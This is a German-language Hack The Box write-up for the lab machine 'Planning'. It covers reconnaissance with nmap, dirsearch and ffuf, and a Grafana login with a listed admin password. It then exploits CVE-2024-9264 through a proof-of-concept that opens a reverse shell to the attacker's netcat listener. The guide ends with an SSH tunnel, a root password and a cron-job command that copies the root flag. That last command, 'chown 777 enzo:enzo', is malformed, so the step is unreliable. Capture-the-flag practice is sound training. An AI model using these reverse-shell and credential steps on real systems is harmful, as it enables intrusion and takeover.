
# 🛠️ HTB Planning – Cheatsheet (deutsch)

## 🧭 Übersicht
Dieser Beitrag beschreibt die Schritte zur Kompromittierung der HTB-Maschine „Planning“ mithilfe von Nmap, Dirsearch, FFUF und der Ausnutzung einer bekannten Grafana-Schwachstelle (CVE-2024-9264).

---

## 1. 🔍 Initiale Erkundung

### Nmap-Scan:
```bash
nmap -sC -sV 10.10.11.68
```

**Ergebnisse:**
- **Port 22**: SSH (OpenSSH 9.6p1)
- **Port 80**: HTTP (nginx 1.24.0)

### Hosts-Datei anpassen:
```bash
echo "10.10.11.68 planning.htb" | sudo tee -a /etc/hosts
```

---

## 2. 📂 Verzeichnis- und Subdomain-Erkennung

### Dirsearch verwenden:
```bash
python3 dirsearch.py -u http://planning.htb
```

**Gefundene Pfade:**
- /about.php
- /contact.php
- /index.php
- /css/
- /img/
- /js/
- /lib/

### Subdomains mit FFUF entdecken:
```bash
ffuf -w /pfad/zur/wordlist.txt -u http://10.10.11.68 -H "Host: FUZZ.planning.htb" -fs 178
```

**Ergebnis:**
- **grafana.planning.htb** (Status: 302)

### Hosts-Datei erneut anpassen:
```bash
echo "10.10.11.68 grafana.planning.htb" | sudo tee -a /etc/hosts
```

---

## 3. 🔓 Zugriff auf Grafana

**Anmeldedaten:**
- Benutzername: `admin`
- Passwort: `0D5oT70Fq13EvB5r`

**Grafana-Version:** v11

**Bekannte Schwachstelle:** CVE-2024-9264

---

## 4. 🎯 Exploit durchführen

**Voraussetzung:** Stelle sicher, dass du einen Listener auf deinem lokalen System eingerichtet hast:
```bash
nc -lvnp <dein_port>
```

**Exploit ausführen:**
```bash
sudo python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip <deine_ip> --reverse-port <dein_port>
```
---

## 5. 🐚 Root-Zugriff erlangen

```bash
netstat -tulpn
```

```bash
port 8000 # reroute mit ssh -L 8000:127.0.0.1:8000 enzo@planning.htb 
```

Es gibt eine weitere Login-Seite. Login mit root:P4ssw0rdS0pRi0T3c. Es können weitere Cronjobs angelegt werden.

```bash
cp /root/root.txt /tmp/root.txt && chown 777 enzo:enzo /tmp/root.txt
```
---

